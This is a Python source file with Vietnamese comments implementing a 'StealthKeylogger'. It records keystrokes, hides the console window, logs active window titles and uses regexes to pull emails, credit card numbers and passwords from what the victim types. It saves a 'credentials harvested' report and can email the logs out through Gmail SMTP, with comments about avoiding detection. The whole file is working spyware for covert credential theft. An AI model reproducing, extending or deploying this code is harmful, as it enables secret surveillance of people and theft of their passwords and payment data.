import time
import os
from datetime import datetime
from pathlib import Path
from pynput.keyboard import Listener, Key
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import getpass
import re
import base64

# Cấu hình email
EMAIL_ADDRESS = ""  
EMAIL_PASSWORD = ""    
EMAIL_CHAR_LIMIT = 50                   

# Cấu hình mode
OFFLINE_MODE = True

# Cấu hình stealth
HIDE_CONSOLE = True
BUFFER = []
BUFFER_SIZE = 20
STOP_EVENT = threading.Event()
LOG_FILE = Path("keystrokes.log")

# Patterns để detect sensitive data
PASSWORD_PATTERNS = [
    r'password[:=]\s*([^\s]+)',
    r'pass[:=]\s*([^\s]+)', 
    r'pwd[:=]\s*([^\s]+)',
    r'login[:=]\s*([^\s]+)'
]

EMAIL_PATTERN = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
CREDIT_CARD_PATTERN = r'\b(?:\d{4}[-\s]?){3}\d{4}\b'

class StealthKeylogger:
    def __init__(self):
        self.current_text = ""
        self.full_log = ""
        self.session_start = datetime.now()
        self.smtp_session = None
        self.current_window = "Unknown Window"
        self.credentials_found = []
        self.setup_smtp()
        
    def setup_smtp(self):
        """Thiết lập kết nối SMTP với Gmail"""
        global OFFLINE_MODE
        if not OFFLINE_MODE:
            try:
                self.smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
                self.smtp_session.starttls()
                self.smtp_session.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                print("✓ Connected to Gmail SMTP server")
            except Exception as e:
                print(f"✗ Failed to connect to SMTP: {e}")
                print("Switching to offline mode...")
                OFFLINE_MODE = True
            
    def hide_console(self):
        """Ẩn console window (Windows only)"""
        if HIDE_CONSOLE and os.name == 'nt':
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
    
    def get_active_window(self):
        """Lấy tên window đang active (Windows only)"""
        try:
            if os.name == 'nt':
                import ctypes
                from ctypes import wintypes
                
                user32 = ctypes.windll.user32
                kernel32 = ctypes.windll.kernel32
                
                hwnd = user32.GetForegroundWindow()
                length = user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
        except:
            pass
        return "Unknown Window"
    
    def analyze_text(self, text):
        """Phân tích text để tìm thông tin nhạy cảm"""
        # Tìm email
        emails = re.findall(EMAIL_PATTERN, text)
        for email in emails:
            self.log_credential("EMAIL", email)
        
        # Tìm credit card
        cards = re.findall(CREDIT_CARD_PATTERN, text)
        for card in cards:
            self.log_credential("CREDIT_CARD", card)
        
        # Tìm password patterns
        for pattern in PASSWORD_PATTERNS:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                self.log_credential("PASSWORD", match)
    
    def log_credential(self, cred_type, value):
        """Log credential tìm được"""
        credential = {
            "type": cred_type,
            "value": value,
            "window": self.current_window,
            "timestamp": datetime.now().isoformat()
        }
        self.credentials_found.append(credential)
        print(f"[CREDENTIAL FOUND] {cred_type}: {value[:10]}...")
    
    def encode_data(self, data):
        """Encode dữ liệu để tránh detection"""
        return base64.b64encode(data.encode()).decode()
    
    def send_email(self, subject, body):
        """Gửi email với nội dung được chỉ định"""
        if OFFLINE_MODE:
            # Trong offline mode, lưu nội dung vào file local
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                email_file = LOG_FILE.parent / f"email_{timestamp}.txt"
                email_content = f"""
Subject: {subject}
Time: {datetime.now().isoformat()}
Content:
{body}
-------------------
"""
                email_file.write_text(email_content, encoding="utf-8")
                print(f"✓ Saved email content to: {email_file}")
                return True
            except Exception as e:
                print(f"✗ Failed to save email content: {e}")
                return False
        else:
            try:
                if self.smtp_session:
                    msg = MIMEMultipart()
                    msg['From'] = EMAIL_ADDRESS
                    msg['To'] = EMAIL_ADDRESS
                    msg['Subject'] = subject
                    
                    msg.attach(MIMEText(body, 'plain'))
                    
                    self.smtp_session.send_message(msg)
                    print(f"✓ Email sent: {subject}")
                    return True
            except Exception as e:
                print(f"✗ Failed to send email: {e}")
                # Thử kết nối lại SMTP
                self.setup_smtp()
            return False
    
    def on_key_press(self, key):
        """Xử lý phím được nhấn"""
        try:
            if key == Key.space:
                self.current_text += ' '
                self.full_log += self.current_text
                self.current_text = ''
            elif key == Key.enter:
                self.current_text += '\n'
                self.full_log += self.current_text
                self.current_text = ''
            elif key == Key.tab:
                self.current_text += '\t'
                self.full_log += self.current_text
                self.current_text = ''
                
                # Gửi email khi đạt giới hạn ký tự
                if len(self.full_log) >= EMAIL_CHAR_LIMIT:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    subject = f"Keylog Report - {timestamp}"
                    self.send_email(subject, self.full_log)
                    self.full_log = ''
                    
            elif key == Key.shift_l or key == Key.shift_r:
                return
            elif key == Key.backspace:
                if self.current_text:
                    self.current_text = self.current_text[:-1]
                elif self.full_log:
                    # Nếu current_text rỗng, xóa ký tự cuối của full_log
                    self.full_log = self.full_log[:-1]
            elif key == Key.esc:  # Đổi từ F12 sang ESC để dễ test
                print("\nStopping keylogger...")
                # Gửi log cuối cùng nếu có
                if self.full_log or self.current_text:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    subject = f"Keylog Final Report - {timestamp}"
                    self.send_email(subject, self.full_log + self.current_text)
                STOP_EVENT.set()
                return False
            elif hasattr(key, 'char') and key.char is not None:
                self.current_text += key.char
            
            # Ghi buffer khi đầy
            if len(BUFFER) >= BUFFER_SIZE:
                self.flush_buffer()
                
        except Exception as e:
            # Silent fail để tránh detection
            pass
    
    def flush_buffer(self):
        """Ghi buffer vào file và upload"""
        try:
            if BUFFER:
                LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
                
                # Đọc nội dung hiện tại
                content = ""
                if LOG_FILE.exists():
                    content = LOG_FILE.read_text(encoding="utf-8")
                
                # Thêm entries mới
                for entry in BUFFER:
                    content += entry + "\n"
                
                # Ghi file
                LOG_FILE.write_text(content, encoding="utf-8")
                print(f"Logged {len(BUFFER)} keystrokes")
                
                BUFFER.clear()
        except Exception as e:
            print(f"Error in flush_buffer: {str(e)}")
    
    def save_session_report(self):
        """Lưu báo cáo session"""
        try:
            report_file = LOG_FILE.parent / f"session_report_{int(time.time())}.log"
            
            # Tính thống kê
            end_time = datetime.now()
            duration = end_time - self.session_start
            total_keystrokes = len(LOG_FILE.read_text(encoding='utf-8').splitlines()) if LOG_FILE.exists() else 0
            
            report = f"""
=== KEYLOGGER SESSION REPORT ===
Start Time: {self.session_start.isoformat()}
End Time: {end_time.isoformat()}
Duration: {duration}
Target User: {getpass.getuser()}
Total Keystrokes: {total_keystrokes}
Total Credentials Found: {len(self.credentials_found)}

=== CREDENTIALS HARVESTED ===
"""
            # Thêm chi tiết credentials tìm được
            for cred in self.credentials_found:
                report += f"[{cred['timestamp']}] {cred['type']}: {cred['value']}\n"
                report += f"  Window: {cred['window']}\n"
            
            # Thêm thống kê theo loại credential
            if self.credentials_found:
                report += "\n=== CREDENTIALS SUMMARY ===\n"
                cred_types = {}
                for cred in self.credentials_found:
                    cred_type = cred['type']
                    cred_types[cred_type] = cred_types.get(cred_type, 0) + 1
                for cred_type, count in cred_types.items():
                    report += f"{cred_type}: {count}\n"
            
            # Lưu file với UTF-8 encoding
            report_file.write_text(report, encoding="utf-8")
            print(f"\nSession report saved: {report_file}")
            
        except Exception as e:
            print(f"Error saving session report: {str(e)}")
    
    def periodic_flush(self):
        """Ghi buffer định kỳ"""
        while not STOP_EVENT.is_set():
            time.sleep(60)  # Ghi mỗi phút
            if BUFFER and not STOP_EVENT.is_set():
                self.flush_buffer()
    
    def start(self):
        """Khởi động keylogger"""
        print("Press ESC to stop")
        print("-" * 50)
        
        # Ẩn console
        self.hide_console()
        
        # Khởi động listener
        try:
            with Listener(on_press=self.on_key_press) as listener:
                listener.join()
        except Exception as e:
            print(f"Error: {e}")
        finally:
            STOP_EVENT.set()
            if self.smtp_session:
                self.smtp_session.quit()
            print("Keylogger stopped")

def main():
    keylogger = StealthKeylogger()
    keylogger.start()

if __name__ == "__main__":
    main()